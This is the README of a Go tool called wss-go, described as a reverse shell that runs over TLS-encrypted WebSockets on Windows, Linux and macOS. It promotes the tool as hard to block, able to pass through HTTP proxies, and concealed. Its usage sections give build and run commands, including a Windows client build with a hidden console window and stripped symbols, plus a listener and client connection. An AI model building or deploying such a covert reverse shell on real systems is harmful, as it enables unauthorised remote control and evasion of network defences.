# wss-go
wss-go is a reverse shell using websocket with tls.

Work for Windows, Linux, MacOS.

## Documentation

- [English](https://github.com/piaolin/wss-go/blob/main/README.md)

- [中文文档](https://github.com/piaolin/wss-go/blob/main/README_ZH.md)

## Introduction

Use Websocket for communication and use SSL certificate for encryption.

## Features

- The HTTP protocol is used in the handshake phase, so it is not easy to block during the handshake and can pass through various HTTP proxy servers.
- Use SSL certificate for encryption.
- The data format is relatively lightweight, the performance overhead is small, and the communication is efficient and concealed.

## Usage
### Windows

```shell
go env -w GOOS=windows
go build -o wssServer server/server.go
go build -o wssClient -ldflags -H=windowsgui -ldflags "-s -w" client/client.go
```

### Screenshots

![](https://i.loli.net/2021/08/29/gHhY4RaGOcDAdnp.png)
![](https://i.loli.net/2021/08/29/YQVOlgW28pmqsto.png)

### MacOS & Linux

```shell
go env -w GOOS=darwin/linux
go build -o wssServer server/server.go
go build -o wssClient client/client.go
./wssServer -addr 0.0.0.0:443
./wssClient -addr 127.0.0.1:443
```

### Screenshots

![](https://i.loli.net/2021/08/29/gExYGVKBzpte1Pv.png)

## TODO

- RSA & AES
